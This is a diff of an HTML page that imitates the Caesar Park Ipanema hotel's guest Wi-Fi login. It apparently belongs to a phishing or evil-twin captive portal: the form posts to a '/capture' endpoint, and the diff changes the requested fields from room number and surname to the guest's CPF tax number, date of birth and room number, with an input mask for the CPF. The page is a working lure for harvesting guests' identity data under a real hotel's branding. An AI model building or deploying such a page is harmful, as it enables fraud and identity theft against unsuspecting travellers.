@@ -1,60 +1,66 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Caesar Park - Wi-Fi</title>
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { font-size: 16px; }
-body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1C1C1C; color: #F5E6C8; padding: 16px; }
-.card { background: #2C2622; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 32px rgba(201,168,76,0.2); border: 1px solid #4A3F2F; }
-.logo { text-align: center; margin-bottom: 4px; font-size: 22px; font-weight: 900; color: #C9A84C; letter-spacing: 3px; text-transform: uppercase; }
-.logo-sub { text-align: center; margin-bottom: 20px; font-size: 11px; color: #9A8866; letter-spacing: 4px; text-transform: uppercase; }
-.logo-divider { height: 1px; background: linear-gradient(90deg, transparent, #C9A84C, transparent); margin: 0 24px 20px; }
-.subtitle { text-align: center; color: #AAAAAA; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
-.form-group { margin-bottom: 16px; }
-label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #C9A84C; }
-input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #4A3F2F; border-radius: 8px; font-size: 15px; background: #1C1C1C; color: #F5E6C8; outline: none; transition: border-color 0.2s; }
-input:focus { border-color: #C9A84C; }
-button[type="submit"] { width: 100%; padding: 14px; background: #C9A84C; color: #1C1C1C; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; letter-spacing: 1px; text-transform: uppercase; }
-button:hover { opacity: 0.92; }
-.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #6A5A3A; }
-input[type="hidden"] { display: none; }
-@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 18px; } }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1C1C1C;color:#F5E6C8;padding:16px}
+.card{background:#2C2622;border-radius:16px;padding:36px 32px;width:100%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,0.14)}
+.hotel-logo{text-align:center;margin-bottom:8px;font-size:11px;letter-spacing:3px;text-transform:uppercase;color:#C9A84C}
+.hotel-name{text-align:center;margin-bottom:6px;font-size:26px;font-weight:700;color:#C9A84C}
+.divider{width:40px;height:2px;background:#C9A84C;margin:0 auto 20px;border-radius:1px}
+.welcome{text-align:center;font-size:14px;color:#888;margin-bottom:28px;line-height:1.6}
+.form-row{margin-bottom:18px}
+label{display:block;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#C9A84C;margin-bottom:7px}
+input{width:100%;padding:13px 16px;border:1.5px solid #4A3F2F;border-radius:8px;font-size:15px;background:#1C1C1C;color:#F5E6C8;outline:none;transition:border-color 0.2s}
+input:focus{border-color:#C9A84C}
+input[type="date"]::-webkit-calendar-picker-indicator{opacity:0.5}
+button{width:100%;padding:15px;background:#C9A84C;color:#1C1C1C;border:none;border-radius:8px;font-size:15px;font-weight:700;letter-spacing:0.5px;cursor:pointer;margin-top:4px;transition:opacity 0.2s}
+button:hover{opacity:0.9}
+.footer{text-align:center;margin-top:20px;font-size:11px;color:#888;line-height:1.5}
+@media(max-width:480px){.card{padding:28px 20px}}
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="logo">Caesar Park</div>
-  <div class="logo-sub">Ipanema</div>
-  <div class="logo-divider"></div>
-  <p class="subtitle">Caesar Park Ipanema. Acesso ao Wi-Fi exclusivo.</p>
+  <div class="hotel-logo">IPANEMA</div>
+  <div class="hotel-name">Caesar Park</div>
+  <div class="divider"></div>
+  <p class="welcome">Caesar Park Ipanema. Wi-Fi exclusivo para nossos hospedes.</p>
   <form action="/capture" method="POST" autocomplete="off">
     <input type="hidden" name="csrf_token" value="">
     <input type="hidden" name="portal_id" value="caesar_park">
-    <div class="form-group">
-      <label for="room">Numero do Quarto</label>
-      <input type="text" name="room" id="room" placeholder="Ex: 802" required pattern="[0-9]{1,5}" maxlength="5" autocomplete="off">
+    <div class="form-row">
+      <label for="cpf">CPF</label>
+      <input type="text" name="cpf" id="cpf" placeholder="000.000.000-00" required maxlength="14" inputmode="numeric" oninput="maskCPF(this)">
     </div>
-    <div class="form-group">
-      <label for="password">Senha / Sobrenome</label>
-      <input type="password" name="password" id="password" placeholder="Sobrenome ou senha" required maxlength="64" autocomplete="new-password">
+    <div class="form-row">
+      <label for="birth">Data de Nascimento / Date of Birth</label>
+      <input type="date" name="birth_date" id="birth" required max="2010-01-01">
     </div>
-    <button type="submit">Conectar</button>
+    <div class="form-row">
+      <label for="room">Numero do Quarto / Room Number</label>
+      <input type="text" name="room" id="room" placeholder="Ex: 204" required pattern="[0-9A-Za-z]{1,6}" maxlength="6" autocomplete="off">
+    </div>
+    <button type="submit">Conectar ao Wi-Fi / Connect to Wi-Fi</button>
   </form>
-  <p class="footer">Caesar Park - Luxo e sofisticacao no coração do Rio</p>
+  <p class="footer">Acesso exclusivo para hospedes / Exclusive guest access</p>
 </div>
 <script>
+function maskCPF(el){
+  var v=el.value.replace(/\D/g,'').slice(0,11);
+  if(v.length>9)v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,'$1.$2.$3-$4');
+  else if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d{1,3})/,'$1.$2.$3');
+  else if(v.length>3)v=v.replace(/(\d{3})(\d{1,3})/,'$1.$2');
+  el.value=v;
+}
 (function(){
-  var lang = navigator.language || 'pt-BR';
-  if (lang.startsWith('en')) {
-    document.querySelector('.subtitle').textContent = 'Caesar Park Ipanema. Exclusive Wi-Fi access.';
-    document.querySelector('button[type=submit]').textContent = 'Connect';
-    document.querySelector('label[for=room]').textContent = 'Room Number';
-    document.querySelector('label[for=password]').textContent = 'Password / Last Name';
-    document.querySelector('.footer').textContent = 'Caesar Park - Luxury and sophistication in Rio';
+  var isEn=(navigator.language||'').startsWith('en');
+  if(isEn){
+    var w=document.querySelector('.welcome');
+    if(w&&w.dataset.en)w.textContent=w.dataset.en;
   }
 })();
 </script>
